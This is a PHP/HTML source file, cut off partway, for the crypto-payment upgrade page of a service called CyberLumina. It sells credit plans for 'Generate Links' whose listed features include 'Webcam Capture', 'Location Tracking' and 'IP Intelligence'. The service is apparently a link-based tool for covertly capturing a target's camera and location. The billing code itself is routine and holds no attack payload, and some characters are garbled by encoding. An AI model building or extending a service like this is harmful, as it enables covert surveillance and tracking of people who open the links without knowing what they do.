<?php
session_start();
if (!isset($_SESSION['user_id'])) { header('Location: login.php'); exit; }
require_once 'db.php';
initDB();
$_userName    = htmlspecialchars($_SESSION['user_name']  ?? 'User');
$_userEmail   = htmlspecialchars($_SESSION['user_email'] ?? '');
$_userCredits = getCredits((int)$_SESSION['user_id']);
$_siteName    = htmlspecialchars(getSiteSetting('site_name','CyberLumina'));

// Load crypto wallet addresses from admin settings
$_wallets = [
  'usdt_trc20' => getSiteSetting('crypto_usdt_trc20',''),
  'usdt_erc20' => getSiteSetting('crypto_usdt_erc20',''),
  'btc'        => getSiteSetting('crypto_btc',''),
  'eth'        => getSiteSetting('crypto_eth',''),
  'bnb'        => getSiteSetting('crypto_bnb',''),
  'ltc'        => getSiteSetting('crypto_ltc',''),
  'sol'        => getSiteSetting('crypto_sol',''),
];

// Read plan prices from DB (admin-editable), fall back to defaults
$_s_usd  = getSiteSetting('plan_starter_usd',  '1.70');
$_s_lkr  = getSiteSetting('plan_starter_lkr',  'LKR 500');
$_s_cr   = (int)getSiteSetting('plan_starter_credits', '500');
$_p_usd  = getSiteSetting('plan_pro_usd',       '4.00');
$_p_lkr  = getSiteSetting('plan_pro_lkr',       'LKR 1,200');
$_p_cr   = (int)getSiteSetting('plan_pro_credits',     '1500');
$_e_usd  = getSiteSetting('plan_elite_usd',     '10.00');
$_e_lkr  = getSiteSetting('plan_elite_lkr',     'LKR 3,000');
$_e_cr   = (int)getSiteSetting('plan_elite_credits',   '5000');

$plans = [
  ['id'=>'starter','name'=>'Starter','emoji'=>'&#x26A1;','tag'=>'ENTRY',
   'credits'=>$_s_cr,'links'=>25,'price'=>$_s_lkr,'usd'=>'$'.number_format((float)$_s_usd,2),'amount_usd'=>(float)$_s_usd,
   'color'=>'#00f0ff','grad'=>'135deg,#00f0ff,#0070ff',
   'features'=>[$_s_cr . ' Credits','25 Generate Links','Webcam Capture','Location Tracking','IP Intelligence','Email Support'],
   'popular'=>false],
  ['id'=>'pro','name'=>'Pro','emoji'=>'&#x1F680;','tag'=>'POPULAR',
   'credits'=>$_p_cr,'links'=>75,'price'=>$_p_lkr,'usd'=>'$'.number_format((float)$_p_usd,2),'amount_usd'=>(float)$_p_usd,
   'color'=>'#a855f7','grad'=>'135deg,#7b2fff,#a855f7',
   'features'=>[$_p_cr . ' Credits','75 Generate Links','All Features Unlocked','Priority Support','Never Expires','Advanced Analytics'],
   'popular'=>true],
  ['id'=>'elite','name'=>'Elite','emoji'=>'&#x1F451;','tag'=>'BEST VALUE',
   'credits'=>$_e_cr,'links'=>250,'price'=>$_e_lkr,'usd'=>'$'.number_format((float)$_e_usd,2),'amount_usd'=>(float)$_e_usd,
   'color'=>'#f59e0b','grad'=>'135deg,#f59e0b,#ff6b00',
   'features'=>[$_e_cr . ' Credits','250 Generate Links','All Features Unlocked','VIP Priority Support','Never Expires','Early Access Features','Dedicated Assistance'],
   'popular'=>false],
];
header('Content-Type: text/html; charset=utf-8');
?><!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Upgrade — <?= $_siteName ?></title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;700;900&family=Inter:wght@300;400;500;600;700&family=Share+Tech+Mono&display=swap" rel="stylesheet"/>
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
:root{
  --bg:#02070d;--s1:rgba(255,255,255,.03);--s2:rgba(255,255,255,.06);
  --text:#f0f6ff;--muted:#566a7a;--subtle:#8899aa;
  --border:rgba(255,255,255,.07);--border2:rgba(255,255,255,.12);
}
html{scroll-behavior:smooth}
body{background:var(--bg);color:var(--text);font-family:'Inter',sans-serif;min-height:100vh;overflow-x:hidden}

/* â”€â”€ Animated BG â”€â”€ */
.bg-wrap{position:fixed;inset:0;z-index:0;overflow:hidden;pointer-events:none}
.bg-wrap canvas{position:absolute;inset:0}
.bg-orb{position:absolute;border-radius:50%;filter:blur(130px);opacity:.18;animation:drift 18s ease-in-out infinite alternate}
.bg-orb.o1{width:700px;height:700px;background:#00f0ff;top:-250px;left:-200px;animation-delay:0s}
.bg-orb.o2{width:600px;height:600px;background:#7b2fff;bottom:-200px;right:-150px;animation-delay:-6s}
.bg-orb.o3{width:400px;height:400px;background:#f59e0b;top:40%;left:50%;animation-delay:-12s;opacity:.08}
@keyframes drift{0%{transform:translate(0,0) scale(1)}100%{transform:translate(40px,30px) scale(1.08)}}

/* â”€â”€ Grid overlay â”€â”€ */
.bg-grid{position:fixed;inset:0;z-index:0;pointer-events:none;
  background-image:linear-gradient(rgba(0,240,255,.025) 1px,transparent 1px),
    linear-gradient(90deg,rgba(0,240,255,.025) 1px,transparent 1px);
  background-size:50px 50px}

/* â”€â”€ Layout â”€â”€ */
.page{position:relative;z-index:1;max-width:1140px;margin:0 auto;padding:0 1.25rem 5rem}

/* â”€â”€ Topbar â”€â”€ */
.topbar{display:flex;align-items:center;justify-content:space-between;padding:1.5rem 0}
.back-btn{display:inline-flex;align-items:center;gap:.45rem;color:var(--muted);
  font-size:.8rem;text-decoration:none;padding:.4rem .85rem;
  border:1px solid var(--border2);border-radius:8px;
  transition:all .2s;backdrop-filter:blur(8px);background:var(--s1)}
.back-btn:hover{color:#00f0ff;border-color:rgba(0,240,255,.3)}
.cr-pill{display:flex;align-items:center;gap:.4rem;padding:.35rem .9rem;
  background:rgba(0,240,255,.06);border:1px solid rgba(0,240,255,.18);
  border-radius:20px;font-size:.77rem;font-family:'Share Tech Mono',monospace;color:#00f0ff}

/* â”€â”€ Hero â”€â”€ */
.hero{text-align:center;padding:3rem 0 2.5rem}
.hero-badge{display:inline-flex;align-items:center;gap:.4rem;
  padding:.35rem 1rem;background:rgba(255,255,255,.04);
  border:1px solid var(--border2);border-radius:30px;
  font-size:.68rem;letter-spacing:.15em;color:var(--subtle);
  text-transform:uppercase;margin-bottom:1.5rem;font-family:'Share Tech Mono',monospace}
.hero-badge::before{content:'';width:6px;height:6px;border-radius:50%;
  background:#00f0ff;box-shadow:0 0 8px #00f0ff;flex-shrink:0}
.hero h1{font-family:'Orbitron',monospace;font-size:clamp(2rem,5vw,3.5rem);
  font-weight:900;line-height:1.1;margin-bottom:1rem;
  background:linear-gradient(135deg,#fff 20%,rgba(255,255,255,.5));
  -webkit-background-clip:text;-webkit-text-fill-color:transparent}
.hero p{color:var(--subtle);font-size:1rem;max-width:480px;margin:0 auto;line-height:1.75}

/* â”€â”€ Credit counter â”€â”€ */
.your-credits{display:flex;align-items:center;justify-content:center;gap:.6rem;
  margin:1.5rem 0 0;font-size:.82rem;color:var(--muted)}
.cr-bar{height:4px;width:140px;background:rgba(255,255,255,.06);border-radius:4px;overflow:hidden}
.cr-fill{height:100%;background:linear-gradient(90deg,#00f0ff,#0070ff);border-radius:4px;
  transition:width .8s cubic-bezier(.4,0,.2,1)}
.cr-num{font-family:'Share Tech Mono',monospace;font-size:.9rem;color:#00f0ff;font-weight:700}

/* â”€â”€ Plans grid â”€â”€ */
.plans{display:grid;grid-template-columns:repeat(3,1fr);gap:1.25rem;margin:3rem 0 2rem}
@media(max-width:780px){.plans{grid-template-columns:1fr;max-width:420px;margin-left:auto;margin-right:auto}}

/* â”€â”€ Plan card â”€â”€ */
.card{position:relative;border-radius:20px;padding:2rem 1.75rem 1.75rem;
  background:rgba(255,255,255,.025);
  border:1px solid var(--border2);
  backdrop-filter:blur(20px);
  transition:transform .35s cubic-bezier(.4,0,.2,1),box-shadow .35s,border-color .35s;
  overflow:hidden;display:flex;flex-direction:column}
.card::before{content:'';position:absolute;inset:0;
  background:radial-gradient(ellipse at top left,var(--c-glow) 0%,transparent 65%);
  opacity:0;transition:opacity .35s;pointer-events:none}
.card:hover{transform:translateY(-8px);border-color:var(--c-border)}
.card:hover::before{opacity:1}
.card:hover .card-glow{opacity:1}
.card-glow{position:absolute;bottom:-60px;left:50%;transform:translateX(-50%);
  width:200px;height:60px;border-radius:50%;
  background:var(--c-color);filter:blur(40px);opacity:0;transition:opacity .35s}

/* Popular card */
.card.pop{border-color:rgba(168,85,247,.5);
  background:rgba(123,47,255,.07);
  box-shadow:0 0 60px rgba(123,47,255,.12)}
.card.pop::before{opacity:.6}

.pop-ring{position:absolute;inset:-1px;border-radius:21px;
  background:linear-gradient(135deg,#7b2fff44,#a855f744,transparent,transparent);
  pointer-events:none}

.pop-badge{position:absolute;top:-1px;left:50%;transform:translateX(-50%);
  padding:.3rem 1.1rem;border-radius:0 0 12px 12px;
  background:linear-gradient(135deg,#7b2fff,#a855f7);
  font-size:.62rem;font-weight:700;letter-spacing:.12em;
  color:#fff;text-transform:uppercase;white-space:nowrap;
  box-shadow:0 4px 20px rgba(123,47,255,.4)}

/* Card inner */
.card-top{display:flex;align-items:center;justify-content:space-between;margin-bottom:1.25rem}
.card-icon{width:44px;height:44px;border-radius:12px;display:flex;align-items:center;
  justify-content:center;font-size:1.4rem;
  background:var(--c-icon-bg);border:1px solid var(--c-border)}
.card-tag{font-size:.6rem;font-weight:700;letter-spacing:.14em;color:var(--c-color);
  font-family:'Share Tech Mono',monospace;opacity:.8}

.card-name{font-family:'Orbitron',monospace;font-size:1.2rem;font-weight:700;
  color:var(--text);margin-bottom:.25rem}

/* Price block */
.price-block{margin:1rem 0 1.5rem;padding:1rem 1.1rem;
  background:rgba(255,255,255,.035);border-radius:12px;
  border:1px solid var(--border)}
.price-usd{font-size:2.4rem;font-weight:900;
  font-family:'Orbitron',monospace;line-height:1;
  background:linear-gradient(var(--c-grad));
  -webkit-background-clip:text;-webkit-text-fill-color:transparent;
  letter-spacing:-.01em}
.price-sub{display:flex;align-items:center;justify-content:space-between;
  margin-top:.5rem}
.price-lkr{font-size:.76rem;color:var(--muted);font-family:'Share Tech Mono',monospace}
.price-links{font-size:.72rem;color:var(--subtle);
  background:rgba(255,255,255,.05);padding:.15rem .5rem;border-radius:20px}

/* Credits bar */
.credits-row{display:flex;align-items:center;justify-content:space-between;
  margin-bottom:1.25rem;font-size:.78rem}
.credits-label{color:var(--muted)}
.credits-count{font-family:'Share Tech Mono',monospace;font-weight:700;color:var(--c-color)}
.credits-bar-wrap{width:100%;height:3px;background:rgba(255,255,255,.06);
  border-radius:3px;overflow:hidden;margin-bottom:1.5rem}
.credits-bar{height:100%;border-radius:3px;
  background:linear-gradient(var(--c-grad))}

/* Features */
.features{list-style:none;display:flex;flex-direction:column;gap:.6rem;flex:1;margin-bottom:1.5rem}
.features li{display:flex;align-items:center;gap:.6rem;font-size:.82rem;color:var(--subtle)}
.feat-check{width:18px;height:18px;border-radius:6px;display:flex;align-items:center;
  justify-content:center;flex-shrink:0;font-size:.65rem;
  background:var(--c-icon-bg);border:1px solid var(--c-border);color:var(--c-color)}

/* CTA button */
.btn-cta{width:100%;padding:.85rem;border:none;border-radius:12px;cursor:pointer;
  font-family:'Orbitron',monospace;font-size:.78rem;font-weight:700;
  letter-spacing:.06em;text-transform:uppercase;transition:all .25s;position:relative;overflow:hidden}
.btn-cta::after{content:'';position:absolute;inset:0;
  background:linear-gradient(rgba(255,255,255,.15),transparent);
  opacity:0;transition:opacity .2s}
.btn-cta:hover::after{opacity:1}
.btn-cta.solid{background:linear-gradient(var(--c-grad));color:#fff;
  box-shadow:0 8px 30px var(--c-shadow)}
.btn-cta.solid:hover{transform:translateY(-2px);box-shadow:0 14px 40px var(--c-shadow)}
.btn-cta.ghost{background:transparent;border:1px solid var(--c-border);color:var(--c-color)}
.btn-cta.ghost:hover{background:var(--c-icon-bg);transform:translateY(-2px)}

/* â”€â”€ How it works â”€â”€ */
.how-wrap{margin:0 0 2.5rem;padding:1.5rem 1.75rem;
  background:rgba(255,255,255,.025);border:1px solid var(--border2);
  border-radius:16px;display:flex;gap:1.25rem;align-items:flex-start}
.how-icon-wrap{width:40px;height:40px;border-radius:10px;flex-shrink:0;
  background:rgba(0,240,255,.08);border:1px solid rgba(0,240,255,.15);
  display:flex;align-items:center;justify-content:center;font-size:1.1rem}
.how-title{font-size:.82rem;font-weight:600;color:var(--text);margin-bottom:.45rem}
.how-steps{display:flex;gap:.5rem;flex-wrap:wrap}
.how-step{display:flex;align-items:center;gap:.35rem;font-size:.72rem;color:var(--muted)}
.how-step-num{width:18px;height:18px;border-radius:50%;background:rgba(255,255,255,.06);
  display:flex;align-items:center;justify-content:center;font-size:.6rem;
  font-family:'Share Tech Mono',monospace;color:#00f0ff;flex-shrink:0}
.how-arrow{color:var(--border2);font-size:.7rem}

/* â”€â”€ Trust row â”€â”€ */
.trust-row{display:flex;align-items:center;justify-content:center;gap:2rem;
  padding:1.5rem 0;border-top:1px solid var(--border);margin-top:1rem;flex-wrap:wrap}
.trust-item{display:flex;align-items:center;gap:.5rem;font-size:.75rem;color:var(--muted)}
.trust-item span{font-size:1rem}

/* â”€â”€ Modal â”€â”€ */
.modal-ov{position:fixed;inset:0;z-index:9999;background:rgba(2,7,13,.88);
  display:none;align-items:center;justify-content:center;padding:1.5rem;
  backdrop-filter:blur(12px)}
.modal-ov.open{display:flex}
.modal{background:#080f18;border:1px solid var(--border2);border-radius:20px;
  width:100%;max-width:460px;max-height:92vh;display:flex;flex-direction:column;
  animation:mup .3s cubic-bezier(.4,0,.2,1)}
@keyframes mup{from{opacity:0;transform:translateY(24px)}to{opacity:1;transform:translateY(0)}}
.modal-head{display:flex;align-items:center;justify-content:space-between;
  padding:1.4rem 1.5rem;border-bottom:1px solid var(--border);flex-shrink:0}
.modal-head h3{font-family:'Orbitron',monospace;font-size:.95rem;color:#00f0ff}
.modal-close{background:none;border:none;color:var(--muted);cursor:pointer;
  font-size:1.3rem;line-height:1;transition:color .15s}
.modal-close:hover{color:var(--text)}
.modal-body{padding:1.5rem;overflow-y:auto;overscroll-behavior:contain}
.modal-body::-webkit-scrollbar{width:4px}
.modal-body::-webkit-scrollbar-track{background:rgba(255,255,255,.03)}
.modal-body::-webkit-scrollbar-thumb{background:rgba(0,240,255,.2);border-radius:4px}
.modal-body::-webkit-scrollbar-thumb:hover{background:rgba(0,240,255,.4)}

.plan-chip{display:flex;align-items:center;justify-content:space-between;
  padding:.85rem 1.1rem;border-radius:12px;margin-bottom:1.25rem;
  background:rgba(255,255,255,.04);border:1px solid var(--border2)}
.plan-chip-name{font-family:'Orbitron',monospace;font-size:.82rem;color:var(--text)}
.plan-chip-price{font-family:'Share Tech Mono',monospace;font-size:1.1rem;color:#00f0ff;font-weight:700}

.f-label{display:block;font-size:.67rem;font-weight:600;letter-spacing:.12em;
  text-transform:uppercase;color:var(--muted);margin-bottom:.4rem;
  font-family:'Share Tech Mono',monospace}
.f-input{width:100%;background:rgba(255,255,255,.04);border:1px solid var(--border2);
  border-radius:10px;padding:.6rem .9rem;color:var(--text);font-size:.87rem;
  font-family:'Inter',sans-serif;outline:none;transition:border-color .2s;margin-bottom:1rem}
.f-input:focus{border-color:rgba(0,240,255,.4)}
.f-input[readonly]{opacity:.5;cursor:not-allowed}
.f-input option{background:#080f18}

.pay-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:.5rem;margin-bottom:1.1rem}
.pay-btn{padding:.55rem .4rem;border:1px solid var(--border2);border-radius:8px;
  background:rgba(255,255,255,.03);color:var(--muted);font-size:.75rem;
  cursor:pointer;text-align:center;transition:all .2s;display:flex;
  flex-direction:column;align-items:center;gap:.2rem}
.pay-btn.active,.pay-btn:hover{border-color:rgba(0,240,255,.35);color:#00f0ff;
  background:rgba(0,240,255,.06)}
.pay-btn .pi{font-size:1.1rem}

/* Crypto styles */
.crypto-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:.45rem;margin-bottom:1rem}
.crypto-btn{padding:.55rem .3rem;border:1px solid var(--border2);border-radius:10px;
  background:rgba(255,255,255,.03);color:var(--muted);font-size:.7rem;
  cursor:pointer;text-align:center;transition:all .2s;display:flex;
  flex-direction:column;align-items:center;gap:.25rem;line-height:1.2}
.crypto-btn .ci{font-size:1.3rem}
.crypto-btn .cn{font-weight:600;font-size:.73rem}
.crypto-btn .ct{font-size:.59rem;opacity:.6;font-family:'Share Tech Mono',monospace}
.crypto-btn.active{border-color:var(--c-acc);color:var(--c-acc);background:var(--c-bg)}
.crypto-btn:hover:not(.active){border-color:rgba(255,255,255,.18);color:var(--text)}

.wallet-box{background:rgba(255,255,255,.03);border:1px solid rgba(0,240,255,.15);
  border-radius:12px;padding:.85rem 1rem;margin-bottom:.85rem}
.wallet-top{display:flex;align-items:center;justify-content:space-between;margin-bottom:.6rem}
.wallet-label{font-size:.65rem;letter-spacing:.12em;color:var(--muted);
  font-family:'Share Tech Mono',monospace;text-transform:uppercase}
.wallet-badge{font-size:.58rem;padding:.15rem .5rem;border-radius:20px;
  font-family:'Share Tech Mono',monospace;font-weight:700;letter-spacing:.06em}
.wallet-addr{font-family:'Share Tech Mono',monospace;font-size:.72rem;color:#00f0ff;
  word-break:break-all;line-height:1.6;cursor:pointer;user-select:all}
.copy-btn{margin-top:.6rem;width:100%;padding:.42rem;border:1px solid rgba(0,240,255,.2);
  border-radius:8px;background:rgba(0,240,255,.06);color:#00f0ff;
  font-size:.7rem;cursor:pointer;font-family:'Share Tech Mono',monospace;
  transition:all .2s}
.copy-btn:hover{background:rgba(0,240,255,.14)}

.net-warn{display:flex;align-items:flex-start;gap:.5rem;padding:.65rem .8rem;
  background:rgba(245,158,11,.07);border:1px solid rgba(245,158,11,.2);
  border-radius:9px;margin-bottom:1rem;font-size:.72rem;color:#f59e0b;line-height:1.5}
.net-warn-icon{font-size:1rem;flex-shrink:0;margin-top:-.05rem}

.f-textarea{width:100%;background:rgba(255,255,255,.04);border:1px solid var(--border2);
  border-radius:10px;padding:.6rem .9rem;color:var(--text);font-size:.85rem;
  font-family:'Inter',sans-serif;outline:none;resize:vertical;min-height:60px;
  transition:border-color .2s;margin-bottom:1.1rem}
.f-textarea:focus{border-color:rgba(0,240,255,.4)}

.btn-submit{width:100%;padding:.82rem;border:none;border-radius:12px;cursor:pointer;
  background:linear-gradient(135deg,#00f0ff,#0070ff);color:#000;
  font-family:'Orbitron',monospace;font-size:.8rem;font-weight:700;
  letter-spacing:.06em;transition:all .25s}
.btn-submit:hover{transform:translateY(-2px);box-shadow:0 10px 30px rgba(0,240,255,.3)}
.btn-submit:disabled{opacity:.35;cursor:not-allowed;transform:none}

.success-state{text-align:center;padding:2rem 1rem;display:none}
.s-circle{width:72px;height:72px;border-radius:50%;background:rgba(16,185,129,.12);
  border:1px solid rgba(16,185,129,.3);display:flex;align-items:center;
  justify-content:center;margin:0 auto 1rem;font-size:2rem}
.s-title{font-family:'Orbitron',monospace;font-size:1rem;color:#10b981;margin-bottom:.5rem}
.s-sub{color:var(--muted);font-size:.82rem;line-height:1.7}
.s-email{color:#00f0ff;font-size:.85rem;margin-top:.5rem;font-family:'Share Tech Mono',monospace}
</style>
</head>
<body>
<div class="bg-wrap">
  <div class="bg-orb o1"></div>
  <div class="bg-orb o2"></div>
  <div class="bg-orb o3"></div>
</div>
<div class="bg-grid"></div>

<div class="page">
  <!-- Topbar -->
  <div class="topbar">
    <a href="index.php" class="back-btn">
      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
      Dashboard
    </a>
    <div class="cr-pill">&#x26A1; <?= $_userCredits ?> credits</div>
  </div>

  <!-- Hero -->
  <div class="hero">
    <div class="hero-badge"> 💎Pricing Plans</div>
    <h1>Power Your Operations</h1>
    <p>Each <strong style="color:#fff">Generate Link</strong> costs 20 credits.<br>Choose a plan and keep running without limits.</p>
    <?php
      $maxCr = 5000;
      $pct   = min(100, round(($_userCredits / $maxCr) * 100));
    ?>
    <div class="your-credits">
      <span>Your balance:</span>
      <span class="cr-num"><?= $_userCredits ?></span>
      <div class="cr-bar"><div class="cr-fill" style="width:<?= $pct ?>%"></div></div>
      <span><?= $maxCr ?></span>
    </div>
  </div>

  <!-- How it works -->
  <div class="how-wrap">
    <div class="how-icon-wrap">&#x2139;</div>
    <div style="flex:1">
      <div class="how-title">How it works</div>
      <div class="how-steps">
        <div class="how-step"><div class="how-step-num">1</div>Choose a plan</div>
        <div class="how-arrow">›</div>
        <div class="how-step"><div class="how-step-num">2</div>Send crypto payment</div>
        <div class="how-arrow">›</div>
        <div class="how-step"><div class="how-step-num">3</div>Submit TX hash</div>
        <div class="how-arrow">›</div>
        <div class="how-step"><div class="how-step-num">4</div>Credits added</div>
      </div>
      <div style="margin-top:.65rem;font-size:.72rem;color:var(--muted);line-height:1.7">
        <span style="color:#26a17b;font-weight:600">⚡ USDT TRC-20:</span> Auto-verified instantly on blockchain. &nbsp;
        <span style="color:#f59e0b;font-weight:600">⏳ BTC / ETH / BNB / others:</span> Manual review within <strong style="color:#fff">24h</strong>.<br>
        Your registered email: <strong style="color:#00f0ff;font-family:'Share Tech Mono',monospace"><?= $_userEmail ?></strong>
      </div>
    </div>
  </div>

  <!-- Plans -->
  <div class="plans">
    <?php
    $shadows = ['#00f0ff33','#7b2fff44','#f59e0b33'];
    $iconBgs = ['rgba(0,240,255,.08)','rgba(123,47,255,.1)','rgba(245,158,11,.08)'];
    $borders = ['rgba(0,240,255,.25)','rgba(168,85,247,.35)','rgba(245,158,11,.25)'];
    $glows   = ['rgba(0,240,255,.06)','rgba(123,47,255,.09)','rgba(245,158,11,.06)'];
    $barPcts = [10, 30, 100]; // visual fill for credits bar
    foreach($plans as $i => $p):
      $cssVars = "
        --c-color:{$p['color']};
        --c-grad:{$p['grad']};
        --c-shadow:{$shadows[$i]};
        --c-icon-bg:{$iconBgs[$i]};
        --c-border:{$borders[$i]};
        --c-glow:{$glows[$i]};
      ";
    ?>
    <div class="card <?= $p['popular'] ? 'pop' : '' ?>" style="<?= $cssVars ?>">
      <?php if($p['popular']): ?>
      <div class="pop-ring"></div>
      <div class="pop-badge">&#x2B50;  Most Popular</div>
      <?php endif; ?>
      <div class="card-glow"></div>

      <div class="card-top">
        <div class="card-icon"><?= $p['emoji'] ?></div>
        <div class="card-tag"><?= $p['tag'] ?></div>
      </div>

      <div class="card-name"><?= $p['name'] ?></div>

      <div class="price-block">
        <div class="price-usd"><?= $p['usd'] ?></div>
        <div class="price-sub">
          <span class="price-lkr"><?= $p['price'] ?></span>
          <span class="price-links"><?= $p['links'] ?> links</span>
        </div>
      </div>

      <div class="credits-row">
        <span class="credits-label">Credits included</span>
        <span class="credits-count"><?= number_format($p['credits']) ?></span>
      </div>
      <div class="credits-bar-wrap">
        <div class="credits-bar" style="width:<?= $barPcts[$i] ?>%"></div>
      </div>

      <ul class="features">
        <?php foreach($p['features'] as $f): ?>
        <li>
          <div class="feat-check"><svg width="11" height="11" viewBox="0 0 12 12" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><polyline points="1.5,6 4.5,9 10.5,3"/></svg></div>
          <?= htmlspecialchars($f) ?>
        </li>
        <?php endforeach; ?>
      </ul>

      <button class="btn-cta <?= $p['popular'] ? 'solid' : 'ghost' ?>"
              onclick="openModal('<?= $p['id'] ?>','<?= $p['name'] ?>','<?= $p['credits'] ?>','<?= $p['usd'] ?>','<?= $p['price'] ?>','<?= $p['amount_usd'] ?>')">
        Get <?= $p['name'] ?> â†’
      </button>
    </div>
    <?php endforeach; ?>
  </div>

  <!-- Trust row -->
  <div class="trust-row">
    <div class="trust-item"><span><svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg></span> Secure & Private</div>
    <div class="trust-item"><span><svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg></span> Credits never expire</div>
    <div class="trust-item"><span><svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg></span> Manual verification</div>
    <div class="trust-item"><span><svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg></span> 24h support</div>
  </div>
</div>

<!-- Modal -->
<div class="modal-ov" id="modal-ov" onclick="if(event.target===this)closeModal()">
  <div class="modal">
    <div class="modal-head">
      <h3 id="m-title">Purchase Plan</h3>
      <button class="modal-close" onclick="closeModal()">✕</button>
    </div>
    <div class="modal-body">
      <!-- Form -->
      <div id="m-form">
        <div class="plan-chip">
          <span class="plan-chip-name" id="m-plan-name">â€”</span>
          <span class="plan-chip-price" id="m-plan-price">â€”</span>
        </div>

        <label class="f-label">Your Name</label>
        <input class="f-input" id="m-name" type="text" value="<?= $_userName ?>"/>

        <label class="f-label">Email</label>
        <input class="f-input" id="m-email" type="email" value="<?= $_userEmail ?>" readonly/>

        <!-- Crypto selector with SVG logos -->
        <label class="f-label">Select Cryptocurrency</label>
        <div class="crypto-grid" id="crypto-grid">

          <button class="crypto-btn active" onclick="selCrypto(this,'usdt_trc20')" style="--c-acc:#26a17b;--c-bg:rgba(38,161,123,.08)">
            <span class="ci">
              <svg viewBox="0 0 32 32" width="22" height="22"><circle cx="16" cy="16" r="16" fill="#26a17b"/><path d="M17.9 17.5v-.9c2.7-.2 4.8-.8 4.8-1.5s-2.1-1.3-4.8-1.5v-1h3.2v-2h-8.2v2h3.2v1c-2.7.2-4.8.8-4.8 1.5s2.1 1.3 4.8 1.5v3.7h1.8v-3.8zm-1.8-1.1c-2.4 0-4.3-.5-4.3-1s1.9-1 4.3-1 4.3.5 4.3 1-1.9 1-4.3 1z" fill="#fff"/></svg>
            </span>
            <span class="cn">USDT</span>
            <span class="ct">TRC-20</span>
          </button>

          <button class="crypto-btn" onclick="selCrypto(this,'btc')" style="--c-acc:#f7931a;--c-bg:rgba(247,147,26,.08)">
            <span class="ci">
              <svg viewBox="0 0 32 32" width="22" height="22"><circle cx="16" cy="16" r="16" fill="#f7931a"/><path d="M22.5 13.7c.3-2-1.2-3-3.3-3.7l.7-2.7-1.6-.4-.7 2.7-1.3-.3.7-2.7-1.6-.4-.7 2.7-2.6-.6-.4 1.7s1.2.3 1.2.4c.6.1.7.5.7.8l-.8 3.1v.2l-1.1 4.4c-.1.2-.3.5-.7.4-.2 0-1.2-.4-1.2-.4l-.8 1.8 2.5.6 1.4.4-.7 2.7 1.6.4.7-2.7 1.3.3-.7 2.7 1.6.4.7-2.7c2.8.5 4.8.3 5.7-2.2.7-2-.1-3.2-1.5-3.9.9-.3 1.6-.9 1.8-2.1zm-3.2 4.5c-.5 2-3.9.9-5 .6l.9-3.5c1.1.3 4.6.8 4.1 2.9zm.5-4.5c-.5 1.8-3.3.9-4.2.7l.8-3.2c.9.2 3.9.7 3.4 2.5z" fill="#fff"/></svg>
            </span>
            <span class="cn">Bitcoin</span>
            <span class="ct">BTC</span>
          </button>

          <button class="crypto-btn" onclick="selCrypto(this,'eth')" style="--c-acc:#627eea;--c-bg:rgba(98,126,234,.08)">
            <span class="ci">
              <svg viewBox="0 0 32 32" width="22" height="22"><circle cx="16" cy="16" r="16" fill="#627eea"/><path d="M16 6l-.2.6v13l.2.2 6.5-3.8L16 6z" fill="rgba(255,255,255,.6)"/><path d="M16 6L9.5 16l6.5 3.8V6z" fill="#fff"/><path d="M16 21.2l-.1.1v4.8l.1.2 6.5-9.2L16 21.2z" fill="rgba(255,255,255,.6)"/><path d="M16 26.3v-5.1l-6.5-4.1L16 26.3z" fill="#fff"/><path d="M16 19.8l6.5-3.8-6.5-3z" fill="rgba(255,255,255,.2)"/><path d="M9.5 16L16 19.8v-6.8L9.5 16z" fill="rgba(255,255,255,.6)"/></svg>
            </span>
            <span class="cn">Ethereum</span>
            <span class="ct">ETH</span>
          </button>

          <button class="crypto-btn" onclick="selCrypto(this,'bnb')" style="--c-acc:#f3ba2f;--c-bg:rgba(243,186,47,.08)">
            <span class="ci">
              <svg viewBox="0 0 32 32" width="22" height="22"><circle cx="16" cy="16" r="16" fill="#f3ba2f"/><path d="M12.1 14.6L16 10.7l3.9 3.9 2.3-2.3L16 6.1l-6.2 6.2 2.3 2.3zM6 16l2.3-2.3L10.6 16l-2.3 2.3L6 16zm6.1 1.4L16 21.3l3.9-3.9 2.3 2.3-6.2 6.2-6.2-6.2 2.3-2.3zm9.3-1.4l2.3-2.3L26 16l-2.3 2.3L21.4 16zm-3-0.1l-2.4-2.4-2.4 2.4 2.4 2.4 2.4-2.4z" fill="#fff"/></svg>
            </span>
            <span class="cn">BNB</span>
            <span class="ct">BEP-20</span>
          </button>

          <button class="crypto-btn" onclick="selCrypto(this,'ltc')" style="--c-acc:#a5a9b8;--c-bg:rgba(165,169,184,.08)">
            <span class="ci">
              <svg viewBox="0 0 32 32" width="22" height="22"><circle cx="16" cy="16" r="16" fill="#bebebe"/><path d="M10 22h12v-2h-8.5l1.2-4.5.8.8 1.5-1.5-.8-.8 1.3-5H10l-1 3.7 1.5.5L10 17l2 1-2 4z" fill="#fff"/></svg>
            </span>
            <span class="cn">Litecoin</span>
            <span class="ct">LTC</span>
          </button>

          <button class="crypto-btn" onclick="selCrypto(this,'sol')" style="--c-acc:#9945ff;--c-bg:rgba(153,69,255,.08)">
            <span class="ci">
